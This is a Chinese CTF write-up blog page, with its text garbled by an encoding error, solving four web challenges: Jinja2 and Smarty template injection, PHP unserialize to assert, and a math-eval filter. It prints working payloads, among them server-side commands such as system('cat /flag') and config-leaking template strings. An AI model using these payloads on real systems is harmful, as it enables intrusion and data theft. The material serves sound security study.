<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> os<br><br>app = flask.Flask(__name__)<span class="hljs-comment">#åˆ›å»ºFlaskåº”ç”¨å®ä¾‹ã€åˆå§‹åŒ–Flaskåº”ç”¨</span><br><br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<span class="hljs-comment">#ä»ç¯å¢ƒå˜é‡ä¸­è·å–åä¸º&#x27;FLAG&#x27;çš„å€¼ï¼Œç„¶åå°†å…¶å­˜å‚¨åœ¨Flaskåº”ç”¨çš„é…ç½®ä¸­</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><span class="hljs-comment">#å®šä¹‰æ ¹è·¯ç”±&#x27;/&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<span class="hljs-comment">#è¿”å›å½“å‰æ–‡ä»¶çš„å†…å®¹</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span><span class="hljs-comment">#å®šä¹‰è·¯ç”± /shrine/&lt;path:shrine&gt;ï¼Œä½¿ç”¨ Jinja2 æ¨¡æ¿æ¸²æŸ“è·¯å¾„å‚æ•°ï¼š</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shrine</span>(<span class="hljs-params">shrine</span>):<span class="hljs-comment">#å½“è®¿é—® /shrine/&lt;path:shrine&gt; è·¯å¾„æ—¶ï¼Œä¼šè°ƒç”¨ shrine å‡½æ•°</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>):<br>        s = s.replace(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> blacklist]) + s<br><br>    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br><br></code></pre></td></tr></table></figure>
<p>é¦–å…ˆåœ¨shrineè·¯å¾„ä¸‹æµ‹è¯•sstièƒ½å¦æ­£å¸¸æ‰§è¡Œ</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">2</span>*<span class="hljs-number">6</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/LK7HQZB5I2M18ONT.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs scss">def <span class="hljs-built_in">safe_jinja</span>(s):<br>       s = s.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;(&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-built_in">replace</span>(<span class="hljs-string">&#x27;)&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>       blacklist = [<span class="hljs-string">&#x27;config&#x27;</span>, <span class="hljs-string">&#x27;self&#x27;</span>]<br>       return <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>([<span class="hljs-string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(c) for c in blacklist]) + s<br><br>   return flask.<span class="hljs-built_in">render_template_string</span>(<span class="hljs-built_in">safe_jinja</span>(shrine))<br></code></pre></td></tr></table></figure>
<p>å†æ¥åˆ†æè¿™æ®µä»£ç <br>è¿™æ®µä»£ç ä½¿ç”¨äº†ä¸€ä¸ªé»‘åå•blacklist,å…¶ä¸­åŒ…å«äº†è¦åœ¨ä¼ å…¥çš„å­—ç¬¦ä¸²sä¸­è¢«æ›¿æ¢çš„ä¸€äº›å­—ç¬¦ä¸²(åœ¨è¿™é‡Œconfigå’Œself)ã€‚å¯¹äºæ¯ä¸ªé»‘åå•çš„å­—ç¬¦ä¸²cï¼Œå®ƒéƒ½ä¼šç”Ÿæˆä¸€ä¸ªjinja2æ¨¡æ¿è¯­æ³•çš„å­—ç¬¦ä¸²<code>&#123;&#123;% set c=None %&#125;&#125;</code>ï¼Œç„¶åå°†è¿™äº›å­—ç¬¦ä¸²è¿æ¥åˆ°åŸå§‹çš„å­—ç¬¦ä¸²sä¹‹å<br>pythonè¿˜æœ‰ä¸€äº›å†…ç½®å‡½æ•°æ¯”å¦‚url_forå’Œget_flashed_messages<br>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/shrine/</span>&#123;&#123;url_for.__globals__&#125;&#125;<span class="hljs-regexp">//</span>è¿”å›è§†å›¾å‡½æ•°çš„urlï¼Œå¯¹å¯¹è±¡çš„å…¨å±€å‘½åç©ºé—´çš„è®¿é—®<br></code></pre></td></tr></table></figure>
<p><img src="/images/PT26X6LGOGY57QTEN2.png" srcset="/img/loading.gif" lazyload><br>payload</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>current_app å…è®¸ä½ è·å–å½“å‰åº”ç”¨çš„ä¸€äº›å±æ€§å’Œé…ç½®ä¿¡æ¯<br><span class="hljs-regexp">/shrine/</span>&#123;&#123;url_for.__globals__[<span class="hljs-string">&#x27;current_app&#x27;</span>].config&#125;&#125;<br>-&gt;è·å–flag<br></code></pre></td></tr></table></figure>
<p><strong>configä¸æ˜¯è¢«åˆ—ä¸ºé»‘åå•äº†å˜›ï¼Ÿï¼Ÿï¼Ÿ</strong><br>å‡è®¾shrineä¸º<code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code><br>ç„¶åä¼ é€’ç»™safe_jinjaå‡½æ•°ï¼Œåœ¨è¿™ä¸ªæƒ…å†µä¸‹ï¼ŒblackliståŒ…å«äº†config,æ‰€ä»¥ç”Ÿæˆçš„jinja2æ¨¡æ¿å­—ç¬¦ä¸²å¦‚ä¸‹</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;% <span class="hljs-name">set</span> <span class="hljs-attr">config</span>=None %&#125;&#125;</span><span class="language-xml">/shrine/</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">url_for.__globals__</span>[&#x27;current_app&#x27;].config&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p>è¿™ä¸ªå­—ç¬¦ä¸²ä¸­çš„<code>&#123;&#123;% set config=None %&#125;&#125;</code>éƒ¨åˆ†æ˜¯ä¸ºäº†å°è¯•è®¾ç½®configå˜é‡ä¸ºNone,ä½†ç”±äºJinja2çš„è¯­æ³•ï¼Œè¿™ä¸ªè®¾ç½®æ“ä½œåœ¨å­—ç¬¦ä¸²ä¸­ä»…ä»…æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œè€Œä¸ä¼šçœŸæ­£åœ°æ‰§è¡Œã€‚</p>
<p>å› æ­¤ï¼Œå°½ç®¡çœ‹èµ·æ¥å¥½åƒconfigè¢«è®¾ç½®ä¸ºNone,å®é™…ä¸ŠJinja2åªæ˜¯æŠŠè¿™éƒ¨åˆ†å½“ä½œæ™®é€šçš„æ–‡æœ¬å¯¹å¾…ï¼Œå¹¶æ²¡æœ‰æ‰§è¡Œå®ƒã€‚å› æ­¤ï¼Œåœ¨æ¸²æŸ“æ¨¡æ¿æ—¶ï¼Œconfigçš„å€¼ä»ç„¶æ˜¯<code>url_for.__globals__[&#39;current_app&#39;].config</code>,è€Œæ²¡æœ‰è¢«è®¾ç½®ä¸ºNone<br><img src="/images/XCUV93B45O8I24U3VXW2.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p>æ£€ç´¢æºä»£ç <br><img src="/images/U30NAQ0SZE9VDQ7O.png" srcset="/img/loading.gif" lazyload><br>æ‰¾åˆ°ä¸€ä¸ªphpæ–‡ä»¶ï¼Œè¿›å»åº·åº·</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#error_reporting(0);</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloPhp</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&quot;Y-m-d h:i:s&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&quot;date&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloPhp</span>;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;source&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-keyword">die</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>@<span class="hljs-variable">$ppp</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br><br></code></pre></td></tr></table></figure>
<p>æ²¡å•¥å¥½åˆ†æçš„ï¼Œç›´æ¥èµ‹å€¼åºåˆ—åŒ–</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$c</span>-&gt;b=<span class="hljs-string">&#x27;assert&#x27;</span>;<br><span class="hljs-variable">$c</span>-&gt;a=<span class="hljs-string">&quot;phpinfo()&quot;</span>;<br>echo serialize(<span class="hljs-variable">$c</span>);<br><span class="hljs-regexp">//</span>O:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;HelloPhp&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">&quot;phpinfo()&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;assert&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>åœ¨å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œ__destructä¼šè¢«è°ƒç”¨<br>ä¹Ÿå°±æ˜¯</p>
<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">echo</span> <span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">assert</span></span>(<span class="hljs-string">&quot;phpinfo()&quot;</span>);</span><br></code></pre></td></tr></table></figure>
<p>assertä¸evalçš„åŠŸèƒ½åŸºæœ¬ç›¸åŒï¼Œä½†ä¸éœ€è¦åé¢åŠ <code>;</code><br>è¿˜æœ‰å‚æ•°sourceä¸èƒ½å‡ºç°ï¼Œä¸ç„¶die(0)ä¼šç›´æ¥ç»“æŸè„šæœ¬<br>payload</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?d</span>ata=<span class="hljs-symbol">O:</span><span class="hljs-number">8</span><span class="hljs-symbol">:<span class="hljs-string">&quot;HelloPhp&quot;</span></span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span>&#123;<span class="hljs-symbol">s:</span><span class="hljs-number">1</span><span class="hljs-symbol">:<span class="hljs-string">&quot;a&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">9</span><span class="hljs-symbol">:<span class="hljs-string">&quot;phpinfo()&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">1</span><span class="hljs-symbol">:<span class="hljs-string">&quot;b&quot;</span></span>;<span class="hljs-symbol">s:</span><span class="hljs-number">6</span><span class="hljs-symbol">:<span class="hljs-string">&quot;assert&quot;</span></span>;&#125;<br></code></pre></td></tr></table></figure>
<p><img src="/images/YCMFTEQZQ5AMTYVRU31.png" srcset="/img/loading.gif" lazyload><br>è¯¦ç»†â€“&gt;<a target="_blank" rel="noopener" href="https://blog.csdn.net/ojingzhiyuan12/article/details/88556074">evalä¸assert</a>&lt;â€“</p>
<h2 id="CISCN2019-åä¸œå—èµ›åŒº-Web11"><a href="#CISCN2019-åä¸œå—èµ›åŒº-Web11" class="headerlink" title="[CISCN2019 åä¸œå—èµ›åŒº]Web11"></a>[CISCN2019 åä¸œå—èµ›åŒº]Web11</h2><p><img src="/images/G35F0ZJN35S68IL67.png" srcset="/img/loading.gif" lazyload><br>æ£€ç´¢é¡µé¢å‘ç°æœ‰ä¸ªæ˜¾ç¤ºipçš„åœ°æ–¹<br>å…ˆåº·åº·èƒ½ä¸èƒ½xffä¼ªé€ ä¸‹ip<br><img src="/images/J3D1FCKLD0WT7OLY5XN.png" srcset="/img/loading.gif" lazyload><br>è¿™æ—¶çœ‹åˆ°æœ€ä¸‹é¢æ˜¾ç¤º<br>Build With Smarty !<br>Smartyæ˜¯ä¸€ä¸ªPHPçš„æ¨¡æ¿å¼•æ“ï¼Œæä¾›è®©ç¨‹åºé€»è¾‘ä¸é¡µé¢æ˜¾ç¤ºï¼ˆHTML&#x2F;CSSï¼‰ä»£ç åˆ†ç¦»çš„åŠŸèƒ½ã€‚è¯¥æ¡†æ¶å‡ºç°è¿‡SSTIæ¼æ´<br>sstiå…ˆä¸Šä¸€å¼ å›¾<br><img src="/images/61b42a16c2b405e6ab1ada36470713f1.png" srcset="/img/loading.gif" lazyload><br>æµ‹è¯•<code>a&#123;*comment*&#125;b</code><br><img src="/images/RJAZ6GRSWBE8ZLSC6R.png" srcset="/img/loading.gif" lazyload><br>æŒ‰ç…§æ­£å¸¸é€»è¾‘ï¼Œåº”è¯¥ç”¨phpè¯­è¨€å»æŸ¥æ‰¾flagã€‚ä¸€èˆ¬æƒ…å†µä¸‹è¾“å…¥{$smarty.version}å°±å¯ä»¥çœ‹åˆ°è¿”å›çš„smartyçš„ç‰ˆæœ¬å·ã€‚è¯¥é¢˜ç›®çš„Smartyç‰ˆæœ¬æ˜¯3.1.30<br><img src="/images/DY839XW0HNZF8LACB1OZG.png" srcset="/img/loading.gif" lazyload><br>åœ¨Smarty3çš„å®˜æ–¹æ‰‹å†Œé‡Œæœ‰ä»¥ä¸‹æè¿°:<br>Smartyå·²ç»åºŸå¼ƒ{php}æ ‡ç­¾ï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚åœ¨Smarty 3.1ï¼Œ{php}ä»…åœ¨SmartyBCä¸­å¯ç”¨ã€‚æ‰€ä»¥åªèƒ½å¦æ‰¾æ–¹æ³•<br><strong>{if}æ ‡ç­¾</strong><br>å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°è¿™æ ·çš„æè¿°ï¼š<br>smartyçš„{if}æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª{if}å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„{&#x2F;if}ä¹Ÿå¯ä»¥ä½¿ç”¨{else}å’Œ{elseif}.å…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚||*,or,&amp;&amp;,and,is_array()ï¼Œç­‰ç­‰ã€‚ã€‚ã€‚æ‰€ä»¥ä¹Ÿå¯ä»¥ä½¿ç”¨<code>&#123;if show_source(&quot;/flag&quot;)&#125;&#123;/if&#125;</code>æ¥è·å¾—flag<br><img src="/images/NGOSYM3EL5ZN0KAAQ.png" srcset="/img/loading.gif" lazyload><br>æˆ–æ˜¯</p>
<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="hljs-template-variable">&#123;<span class="hljs-keyword">if</span> system(&#x27;cat flag&#x27;)&#125;</span><span class="hljs-template-tag">&#123;/<span class="hljs-name">if</span>&#125;</span><br></code></pre></td></tr></table></figure>
<p>åœ¨å‰é¢çš„æ¨¡æ¿å›¾ä¸­æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨å¦ä¸€ç§æ–¹æ³•<br>xffä¸­è¾“å…¥</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-number">7</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/VYY7B6N5IKE3WV71CVL.png" srcset="/img/loading.gif" lazyload><br>å†è¾“å…¥</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">7</span>*<span class="hljs-string">&#x27;7&#x27;</span>&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p>å›æ˜¾ä¸º49<br>ç¡®å®šä¸ºtwigæ¨¡æ¿<br>RCE</p>
<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//css index.php smarty templates_c xff</span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;ls /&#x27;</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">system</span>(<span class="hljs-name">&#x27;cat /flag&#x27;</span>)&#125;&#125;</span><br></code></pre></td></tr></table></figure>
<p>flagåœ¨æºç ä¸­ğŸ‘€</p>
<h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-comment">//ä¾‹å­ c=20-1</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$content</span>) &gt;= <span class="hljs-number">80</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);<br>    &#125;<br>    <span class="hljs-variable">$blacklist</span> = [<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-string">&#x27;\t&#x27;</span>, <span class="hljs-string">&#x27;\r&#x27;</span>, <span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&#x27;`&#x27;</span>, <span class="hljs-string">&#x27;\[&#x27;</span>, <span class="hljs-string">&#x27;\]&#x27;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$blacklist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$blackitem</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$blackitem</span> . <span class="hljs-string">&#x27;/m&#x27;</span>, <span class="hljs-variable">$content</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span><br>    <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&#x27;abs&#x27;</span>, <span class="hljs-string">&#x27;acos&#x27;</span>, <span class="hljs-string">&#x27;acosh&#x27;</span>, <span class="hljs-string">&#x27;asin&#x27;</span>, <span class="hljs-string">&#x27;asinh&#x27;</span>, <span class="hljs-string">&#x27;atan2&#x27;</span>, <span class="hljs-string">&#x27;atan&#x27;</span>, <span class="hljs-string">&#x27;atanh&#x27;</span>, <span class="hljs-string">&#x27;base_convert&#x27;</span>, <span class="hljs-string">&#x27;bindec&#x27;</span>, <span class="hljs-string">&#x27;ceil&#x27;</span>, <span class="hljs-string">&#x27;cos&#x27;</span>, <span class="hljs-string">&#x27;cosh&#x27;</span>, <span class="hljs-string">&#x27;decbin&#x27;</span>, <span class="hljs-string">&#x27;dechex&#x27;</span>, <span class="hljs-string">&#x27;decoct&#x27;</span>, <span class="hljs-string">&#x27;deg2rad&#x27;</span>, <span class="hljs-string">&#x27;exp&#x27;</span>, <span class="hljs-string">&#x27;expm1&#x27;</span>, <span class="hljs-string">&#x27;floor&#x27;</span>, <span class="hljs-string">&#x27;fmod&#x27;</span>, <span class="hljs-string">&#x27;getrandmax&#x27;</span>, <span class="hljs-string">&#x27;hexdec&#x27;</span>, <span class="hljs-string">&#x27;hypot&#x27;</span>, <span class="hljs-string">&#x27;is_finite&#x27;</span>, <span class="hljs-string">&#x27;is_infinite&#x27;</span>, <span class="hljs-string">&#x27;is_nan&#x27;</span>, <span class="hljs-string">&#x27;lcg_value&#x27;</span>, <span class="hljs-string">&#x27;log10&#x27;</span>, <span class="hljs-string">&#x27;log1p&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;max&#x27;</span>, <span class="hljs-string">&#x27;min&#x27;</span>, <span class="hljs-string">&#x27;mt_getrandmax&#x27;</span>, <span class="hljs-string">&#x27;mt_rand&#x27;</span>, <span class="hljs-string">&#x27;mt_srand&#x27;</span>, <span class="hljs-string">&#x27;octdec&#x27;</span>, <span class="hljs-string">&#x27;pi&#x27;</span>, <span class="hljs-string">&#x27;pow&#x27;</span>, <span class="hljs-string">&#x27;rad2deg&#x27;</span>, <span class="hljs-string">&#x27;rand&#x27;</span>, <span class="hljs-string">&#x27;round&#x27;</span>, <span class="hljs-string">&#x27;sin&#x27;</span>, <span class="hljs-string">&#x27;sinh&#x27;</span>, <span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;srand&#x27;</span>, <span class="hljs-string">&#x27;tan&#x27;</span>, <span class="hljs-string">&#x27;tanh&#x27;</span>];<br>    <span class="hljs-title function_ invoke__">preg_match_all</span>(<span class="hljs-string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$used_funcs</span>);  <br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$used_funcs</span>[<span class="hljs-number">0</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$func</span>) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span><br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;echo &#x27;</span>.<span class="hljs-variable">$content</span>.<span class="hljs-string">&#x27;;&#x27;</span>);<br>&#125; <br></code></pre></td></tr></table></figure>

<p>å¾ˆæœ‰æ„æ€çš„é¢˜ï¼Œç…§ç€ç­”æ¡ˆ+chatåˆ†æäº†å¾ˆä¹…ï¼Œé•¿è§è¯†äº†ğŸ˜Š</p>
